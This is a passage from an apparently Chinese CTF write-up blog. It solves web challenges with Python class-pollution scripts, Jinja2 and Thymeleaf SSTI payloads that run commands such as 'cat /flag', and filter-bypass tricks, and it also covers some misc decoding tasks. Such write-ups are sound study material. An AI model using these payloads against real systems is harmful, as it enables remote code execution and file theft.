class=\"string\">&quot;这个魔术还行吧&quot;</span></span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"string\">&quot;我要json的魔术&quot;</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"string\">&quot;记得用POST方法把魔术交上来&quot;</span></span><br></pre></td></tr></table></figure>\n\n<p>需要将黑名单ban掉，<strong>将payload以json的格式通过POST传入 &#x2F;magic</strong> exp如下</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> requests</span><br><span class=\"line\"><span class=\"keyword\">import</span> json</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 构建要发送的 payload</span></span><br><span class=\"line\">payload = &#123;</span><br><span class=\"line\">    <span class=\"string\">&quot;__class__&quot;</span>: &#123;</span><br><span class=\"line\">        <span class=\"string\">&quot;__init__&quot;</span>: &#123;</span><br><span class=\"line\">            <span class=\"string\">&quot;__globals__&quot;</span>: &#123;</span><br><span class=\"line\">                <span class=\"string\">&quot;BLACKLIST_IN_index&quot;</span>: []</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 将 payload 转换为 JSON 格式</span></span><br><span class=\"line\">json_payload = json.dumps(payload)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 定义 URL</span></span><br><span class=\"line\">url = <span class=\"string\">&quot;http://gz.imxbt.cn:20155/magic&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 打印请求的键和值</span></span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&quot;请求的 URL:&quot;</span>, url)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&quot;请求的头部信息:&quot;</span>, &#123;<span class=\"string\">&#x27;Content-Type&#x27;</span>: <span class=\"string\">&#x27;application/json&#x27;</span>&#125;)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&quot;请求的 Payload:&quot;</span>, json_payload)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">try</span>:</span><br><span class=\"line\">    <span class=\"comment\"># 发送 POST 请求</span></span><br><span class=\"line\">    response = requests.post(url, data=json_payload, headers=&#123;<span class=\"string\">&#x27;Content-Type&#x27;</span>: <span class=\"string\">&#x27;application/json&#x27;</span>&#125;)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># 打印响应内容</span></span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">&quot;状态码:&quot;</span>, response.status_code)</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">&quot;响应内容:&quot;</span>, response.text)</span><br><span class=\"line\"><span class=\"keyword\">except</span> requests.exceptions.RequestException <span class=\"keyword\">as</span> e:</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">&quot;请求发生错误:&quot;</span>, e)</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">payload = &#123;</span><br><span class=\"line\">    <span class=\"string\">&quot;__init__&quot;</span>: &#123;</span><br><span class=\"line\">        <span class=\"string\">&quot;__globals__&quot;</span>: &#123;</span><br><span class=\"line\">            <span class=\"string\">&quot;BLACKLIST_IN_index&quot;</span>: []</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>发送响应的json字符串</p>\n<p><img src=\"/post/%E8%B5%9B%E4%BA%8B%E6%80%BB%E7%BB%93/image-20241014155227175.png\"></p>\n<h3 id=\"SSTI注入\"><a href=\"#SSTI注入\" class=\"headerlink\" title=\"SSTI注入\"></a>SSTI注入</h3><p>再次进行ssti注入发现无黑名单</p>\n<p>最终payload:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;&#123;config.__class__.__init__.__globals__[&#x27;os&#x27;].popen(&#x27;cat /flag&#x27;).read()&#125;&#125; </span><br><span class=\"line\">&#123;&#123;lipsum.__globals__.os.popen(&#x27;whoami&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"圣钥之战1-0\"><a href=\"#圣钥之战1-0\" class=\"headerlink\" title=\"圣钥之战1.0\"></a>圣钥之战1.0</h2><h3 id=\"特殊变量与原型链污染的关系\"><a href=\"#特殊变量与原型链污染的关系\" class=\"headerlink\" title=\"特殊变量与原型链污染的关系\"></a>特殊变量与原型链污染的关系</h3><p>在&#x2F;read路由下看到</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> flask <span class=\"keyword\">import</span> Flask,request</span><br><span class=\"line\"><span class=\"keyword\">import</span> json</span><br><span class=\"line\"></span><br><span class=\"line\">app = Flask(__name__)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">merge</span>(<span class=\"params\">src, dst</span>):</span><br><span class=\"line\">    <span class=\"keyword\">for</span> k, v <span class=\"keyword\">in</span> src.items():</span><br><span class=\"line\">        <span class=\"keyword\">if</span> <span class=\"built_in\">hasattr</span>(dst, <span class=\"string\">&#x27;__getitem__&#x27;</span>):</span><br><span class=\"line\">            <span class=\"keyword\">if</span> dst.get(k) <span class=\"keyword\">and</span> <span class=\"built_in\">type</span>(v) == <span class=\"built_in\">dict</span>:</span><br><span class=\"line\">                merge(v, dst.get(k))</span><br><span class=\"line\">            <span class=\"keyword\">else</span>:</span><br><span class=\"line\">                dst[k] = v</span><br><span class=\"line\">        <span class=\"keyword\">elif</span> <span class=\"built_in\">hasattr</span>(dst, k) <span class=\"keyword\">and</span> <span class=\"built_in\">type</span>(v) == <span class=\"built_in\">dict</span>:</span><br><span class=\"line\">            merge(v, <span class=\"built_in\">getattr</span>(dst, k))</span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            <span class=\"built_in\">setattr</span>(dst, k, v)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">is_json</span>(<span class=\"params\">data</span>):</span><br><span class=\"line\">    <span class=\"keyword\">try</span>:</span><br><span class=\"line\">        json.loads(data)</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">True</span></span><br><span class=\"line\">    <span class=\"keyword\">except</span> ValueError:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">False</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">cls</span>():</span><br><span class=\"line\">    <span class=\"keyword\">def</span> <span class=\"title function_\">__init__</span>(<span class=\"params\">self</span>):</span><br><span class=\"line\">        <span class=\"keyword\">pass</span></span><br><span class=\"line\"></span><br><span class=\"line\">instance = cls()</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">@app.route(<span class=\"params\"><span class=\"string\">&#x27;/&#x27;</span>, methods=[<span class=\"string\">&#x27;GET&#x27;</span>, <span class=\"string\">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">hello_world</span>():</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"built_in\">open</span>(<span class=\"string\">&#x27;/static/index.html&#x27;</span>, encoding=<span class=\"string\">&quot;utf-8&quot;</span>).read()</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">@app.route(<span class=\"params\"><span class=\"string\">&#x27;/read&#x27;</span>, methods=[<span class=\"string\">&#x27;GET&#x27;</span>, <span class=\"string\">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">Read</span>():</span><br><span class=\"line\">    file = <span class=\"built_in\">open</span>(__file__, encoding=<span class=\"string\">&quot;utf-8&quot;</span>).read()</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"string\">f&quot;J1ngHong说：你想read flag吗？</span></span><br><span class=\"line\"><span class=\"string\">那么圣钥之光必将阻止你！</span></span><br><span class=\"line\"><span class=\"string\">但是小小的源码没事，因为你也读不到flag(乐)</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\"><span class=\"subst\">&#123;file&#125;</span></span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">@app.route(<span class=\"params\"><span class=\"string\">&#x27;/pollute&#x27;</span>, methods=[<span class=\"string\">&#x27;GET&#x27;</span>, <span class=\"string\">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">Pollution</span>():</span><br><span class=\"line\">    <span class=\"keyword\">if</span> request.is_json:</span><br><span class=\"line\">        merge(json.loads(request.data),instance)</span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"string\">&quot;J1ngHong说：钥匙圣洁无暇，无人可以污染！&quot;</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"string\">&quot;J1ngHong说：圣钥暗淡了一点，你居然污染成功了？&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">&#x27;__main__&#x27;</span>:</span><br><span class=\"line\">    app.run(host=<span class=\"string\">&#x27;0.0.0.0&#x27;</span>,port=<span class=\"number\">80</span>)</span><br></pre></td></tr></table></figure>\n\n<p>看到&#x2F;read路由是通过<code>__file__</code>来读取文件，<code>__file__</code>的值可以通过merge来修改，直接构造payload</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> requests</span><br><span class=\"line\"><span class=\"keyword\">import</span> json</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 构建要发送的 payload</span></span><br><span class=\"line\">payload = &#123;</span><br><span class=\"line\">    <span class=\"string\">&quot;__init__&quot;</span>: &#123;</span><br><span class=\"line\">        <span class=\"string\">&quot;__globals__&quot;</span>: &#123;</span><br><span class=\"line\">            <span class=\"string\">&quot;__file__&quot;</span>: <span class=\"string\">&quot;flag&quot;</span> <span class=\"comment\">#/proc/1/environ</span></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 将 payload 转换为 JSON 格式</span></span><br><span class=\"line\">json_payload = json.dumps(payload)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 定义 URL</span></span><br><span class=\"line\">url = <span class=\"string\">&quot;http://gz.imxbt.cn:20199/pollute&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 打印请求的键和值</span></span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&quot;请求的 URL:&quot;</span>, url)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&quot;请求的头部信息:&quot;</span>, &#123;<span class=\"string\">&#x27;Content-Type&#x27;</span>: <span class=\"string\">&#x27;application/json&#x27;</span>&#125;)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&quot;请求的 Payload:&quot;</span>, json_payload)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">try</span>:</span><br><span class=\"line\">    <span class=\"comment\"># 发送 POST 请求</span></span><br><span class=\"line\">    response = requests.post(url, data=json_payload, headers=&#123;<span class=\"string\">&#x27;Content-Type&#x27;</span>: <span class=\"string\">&#x27;application/json&#x27;</span>&#125;)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># 打印响应内容</span></span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">&quot;状态码:&quot;</span>, response.status_code)</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">&quot;响应内容:&quot;</span>, response.text)</span><br><span class=\"line\"><span class=\"keyword\">except</span> requests.exceptions.RequestException <span class=\"keyword\">as</span> e:</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">&quot;请求发生错误:&quot;</span>, e)</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>再次访问&#x2F;read即可</p>\n<p><code>/proc/1/environ 文件用于存放进程 ID 为 1 的进程（通常是 init 或 systemd）的环境变量。该文件包含了一系列以空字符 (\\0) 分隔的环境变量，这些变量在进程启动时被设置</code></p>\n<h1 id=\"御网2024wp\"><a href=\"#御网2024wp\" class=\"headerlink\" title=\"御网2024wp\"></a>御网2024wp</h1><h2 id=\"misc\"><a href=\"#misc\" class=\"headerlink\" title=\"misc\"></a>misc</h2><h3 id=\"信息安全大赛的通知\"><a href=\"#信息安全大赛的通知\" class=\"headerlink\" title=\"信息安全大赛的通知\"></a>信息安全大赛的通知</h3><p>ctrl+A复制到记事本看到flag</p>\n<p><img src=\"/post/%E8%B5%9B%E4%BA%8B%E6%80%BB%E7%BB%93/image-20240922110959165.png\" alt=\"image-20240922110959165\"></p>\n<h3 id=\"编码转换\"><a href=\"#编码转换\" class=\"headerlink\" title=\"编码转换\"></a>编码转换</h3><p>第一段Brainfuck </p>\n<p><img src=\"/post/%E8%B5%9B%E4%BA%8B%E6%80%BB%E7%BB%93/image-20240922110115336.png\" alt=\"image-20240922110115336\"></p>\n<p>第二段JSFUCK</p>\n<p><img src=\"/post/%E8%B5%9B%E4%BA%8B%E6%80%BB%E7%BB%93/image-20240922110208419.png\" alt=\"image-20240922110208419\"></p>\n<p>第三段Brainfuck </p>\n<p><img src=\"/post/%E8%B5%9B%E4%BA%8B%E6%80%BB%E7%BB%93/image-20240922110755086.png\" alt=\"image-20240922110755086\"></p>\n<h3 id=\"coding-analyse\"><a href=\"#coding-analyse\" class=\"headerlink\" title=\"coding_analyse\"></a>coding_analyse</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&amp;#x39;&amp;#x33;&amp;#x36;&amp;#x35;&amp;#x34;&amp;#x34;&amp;#x61;&amp;#x35;&amp;#x35;&amp;#x33;&amp;#x31;&amp;#x34;&amp;#x61;&amp;#x37;&amp;#x65;&amp;#x34;&amp;#x33;&amp;#x33;&amp;#x39;&amp;#x35;&amp;#x34;&amp;#x35;&amp;#x66;&amp;#x34;&amp;#x37;&amp;#x37;&amp;#x37;&amp;#x36;&amp;#x61;&amp;#x36;&amp;#x65;&amp;#x34;&amp;#x31;&amp;#x33;&amp;#x31;&amp;#x35;&amp;#x61;&amp;#x37;&amp;#x64;&amp;#x34;&amp;#x31;&amp;#x33;&amp;#x32;&amp;#x35;&amp;#x37;&amp;#x34;&amp;#x33;&amp;#x35;&amp;#x37;&amp;#x35;&amp;#x36;&amp;#x35;&amp;#x35;&amp;#x34;&amp;#x35;&amp;#x35;&amp;#x62;&amp;#x34;&amp;#x34;&amp;#x37;&amp;#x38;&amp;#x35;&amp;#x31;&amp;#x36;&amp;#x61;&amp;#x36;&amp;#x35;&amp;#x33;&amp;#x37;&amp;#x34;&amp;#x31;&amp;#x36;</span><br></pre></td></tr></table></figure>\n\n<p>转换编码为16进制并逆序输出</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">6147356a6158744b55455657534752314d7a51314e6a67774f5459334e7a41355a445639</span><br></pre></td></tr></table></figure>\n\n<p>16进制转ascii</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">aG5jaXtKUEVWSGR1MzQ1NjgwOTY3NzA5ZDV9</span><br></pre></td></tr></table></figure>\n\n<p>base64 rot13</p>\n<p><img src=\"/post/%E8%B5%9B%E4%BA%8B%E6%80%BB%E7%BB%93/image-20240922150926578.png\" alt=\"image-20240922150926578\"></p>\n<p><img src=\"/post/%E8%B5%9B%E4%BA%8B%E6%80%BB%E7%BB%93/image-20240922151055400.png\" alt=\"image-20240922151055400\"></p>\n<h2 id=\"WEB\"><a href=\"#WEB\" class=\"headerlink\" title=\"WEB\"></a>WEB</h2><h3 id=\"input-data\"><a href=\"#input-data\" class=\"headerlink\" title=\"input_data\"></a>input_data</h3><p>svn泄露访问&#x2F;.svn</p>\n<p>文件一个个看发现flag</p>\n<p><img src=\"/post/%E8%B5%9B%E4%BA%8B%E6%80%BB%E7%BB%93/image-20240922111147277.png\" alt=\"image-20240922111147277\"></p>\n<h3 id=\"admin\"><a href=\"#admin\" class=\"headerlink\" title=\"admin\"></a>admin</h3><p>看见报错页面知道是springboot框架</p>\n<p>搜索springboot ssti看到到thymeleaf SSTI 漏洞</p>\n<p>扫描目录和测试参数可知</p>\n<p><a href=\"http://101.200.58.4:3333//admin/?path=\">http://101.200.58.4:3333//admin/?path=</a></p>\n<p>根据文章仿造payload</p>\n<p><strong>文章payload</strong></p>\n<p><img src=\"/post/%E8%B5%9B%E4%BA%8B%E6%80%BB%E7%BB%93/image-20240922160229808.png\" alt=\"image-20240922160229808\"></p>\n<p><strong>题目payload</strong></p>\n<p><a href=\"http://101.200.58.4:3333//admin/?path=__$%7Bnew%20java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(%22cat%20/flag%22).getInputStream()).next()%7D__**::x\">http://101.200.58.4:3333//admin/?path=__$%7bnew%20java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(%22cat%20/flag%22).getInputStream()).next()%7d__**::x</a>**</p>\n<p><img src=\"/post/%E8%B5%9B%E4%BA%8B%E6%80%BB%E7%BB%93/image-20240922173632374.png\" alt=\"image-20240922173632374\"></p>\n<h3 id=\"Flask\"><a href=\"#Flask\" class=\"headerlink\" title=\"Flask\"></a>Flask</h3><p>下载附件可得参数evalme,查看代码本质就是读取文件</p>\n<p>需要绕过过滤，python中%c是占位符</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">formatted_string = <span class=\"string\">&quot;%c%c%c%c%c&quot;</span> % (<span class=\"number\">47</span>, <span class=\"number\">102</span>, <span class=\"number\">108</span>, <span class=\"number\">97</span>, <span class=\"number\">103</span>)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(formatted_string) </span><br></pre></td></tr></table></figure>\n\n<p>使用这种方式可以替代 &#x2F;flag,在进行url编码读取flag</p>\n<p>payload:</p>\n<p><a href=\"http://101.200.58.4:1111/?evalme=%22%25c%25c%25c%25c%25c%22%25(47,102,108,97,103)\">http://101.200.58.4:1111/?evalme=%22%c%c%c%c%c%22%(47,102,108,97,103)</a></p>\n<h3 id=\"如此多的FLAG\"><a href=\"#如此多的FLAG\" class=\"headerlink\" title=\"如此多的FLAG\"></a>如此多的FLAG</h3><p>源代码看到F1aaj.php</p>\n<p>访问看到假flag，于是继续查看页面，</p>\n<p>目录扫面无果</p>\n<p>查看源代码无果</p>\n<p>抓包查看cookie有<strong>FFLLL4g.php</strong></p>\n<p>访问页面</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"> <span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"title function_ invoke__\">highlight_file</span>(<span class=\"keyword\">__FILE__</span>);</span><br><span class=\"line\"><span class=\"keyword\">if</span> (<span class=\"keyword\">isset</span>(<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;X&#x27;</span>])) &#123;</span><br><span class=\"line\">    <span class=\"variable\">$temp</span> = <span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;X&#x27;</span>];</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (!<span class=\"title function_ invoke__\">is_numeric</span>(<span class=\"variable\">$temp</span>)) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">die</span>(<span class=\"string\">&quot;no numeric&quot;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (<span class=\"variable\">$temp</span> &gt; <span class=\"number\">9999</span>) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"string\">&quot;&lt;br&gt;Pupil.&lt;/br&gt;&quot;</span>;</span><br><span class=\"line\">    &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">die</span>(<span class=\"string\">&quot;NO!NO!NO!&quot;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">die</span>(<span class=\"string\">&quot;Where is X?&quot;</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> (<span class=\"keyword\">isset</span>(<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;Y&#x27;</span>])) &#123;</span><br><span class=\"line\">    <span class=\"variable\">$md5</span> = <span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;Y&#x27;</span>];</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (<span class=\"variable\">$md5</span> == <span class=\"title function_ invoke__\">md5</span>(<span class=\"variable\">$md5</span>)) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"string\">&quot;Junior school student.&lt;/br&gt;&quot;</span>;</span><br><span class=\"line\">    &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">die</span>(<span class=\"string\">&quot;NO!NO!NO!&quot;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">die</span>(<span class=\"string\">&quot;Where is Y?&quot;</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> (<span class=\"keyword\">isset</span>(<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;Z&#x27;</span>])) &#123;</span><br><span class=\"line\">    <span class=\"variable\">$content</span> = <span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;Z&#x27;</span>];</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (<span class=\"title function_ invoke__\">strlen</span>(<span class=\"variable\">$content</span>) &gt;= <span class=\"number\">60</span>) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">die</span>(<span class=\"string\">&quot;No long!&quot;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"variable\">$blacklist</span> = <span class=\"keyword\">array</span>(<span class=\"string\">&#x27;,&#x27;</span>, <span class=\"string\">&#x27;&quot;&#x27;</span>, <span class=\"string\">&#x27;\\[&#x27;</span>, <span class=\"string\">&#x27;\\]&#x27;</span>, <span class=\"string\">&#x27;\\0&#x27;</span>, <span class=\"string\">&#x27;&#x27;</span>, <span class=\"string\">&#x27;t&#x27;</span>, <span class=\"string\">&#x27;x&#x27;</span>, <span class=\"string\">&#x27;m&#x27;</span>);</span><br><span class=\"line\">    <span class=\"keyword\">foreach</span> (<span class=\"variable\">$blacklist</span> <span class=\"keyword\">as</span> <span class=\"variable\">$blackitem</span>) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (<span class=\"title function_ invoke__\">preg_match</span>(<span class=\"string\">&#x27;/&#x27;</span> . <span class=\"variable\">$blackitem</span> . <span class=\"string\">&#x27;/m&#x27;</span>, <span class=\"variable\">$content</span>)) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">die</span>(<span class=\"string\">&quot;NO!NO!NO!&quot;</span>);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span 